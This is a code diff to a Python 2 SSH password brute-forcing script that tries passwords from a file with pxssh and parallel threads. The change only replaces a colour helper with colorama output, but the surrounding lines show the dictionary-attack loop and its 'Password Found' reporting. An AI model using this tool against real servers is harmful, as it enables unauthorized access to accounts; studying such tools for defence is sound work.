@@ -25,7 +25,7 @@ import pxssh
 import time
 from docopt import docopt
 from threading import Thread, BoundedSemaphore
-from utilities import escape_color
+from colorama import Fore, init
 
 
 maxConnections = 5
@@ -47,7 +47,7 @@ def connect(host, user, password, release):
     try:
         s = pxssh.pxssh()
         s.login(host, user, password)
-        print escape_color('[+] Password Found: ' + password, "green")
+        print Fore.GREEN + '[+] Password Found: ' + password + Fore.RESET
         Found = True
     except Exception, e:
         if 'read_nonblocking' in str(e):
@@ -66,10 +66,10 @@ def main(arguments):
     fn = open(arguments['<password_file>'], 'r')
     for line in fn.readlines():
         if Found:
-            print escape_color("[*] Exiting: Password Found", "green")
+            print Fore.GREEN + "[*] Exiting: Password Found" + Fore.RESET
             exit(0)
         if Fails > 5:
-            print escape_color("[!] Exiting: Too Many Socket Timeouts", "red")
+            print Fore.RED + "[!] Exiting: Too Many Socket Timeouts" + Fore.RESET
             exit(0)
 
         connection_lock.acquire()
@@ -80,5 +80,6 @@ def main(arguments):
         t.start()
 
 if __name__ == '__main__':
+    init()
     arguments = docopt(__doc__, version="0.1")
     main(arguments)
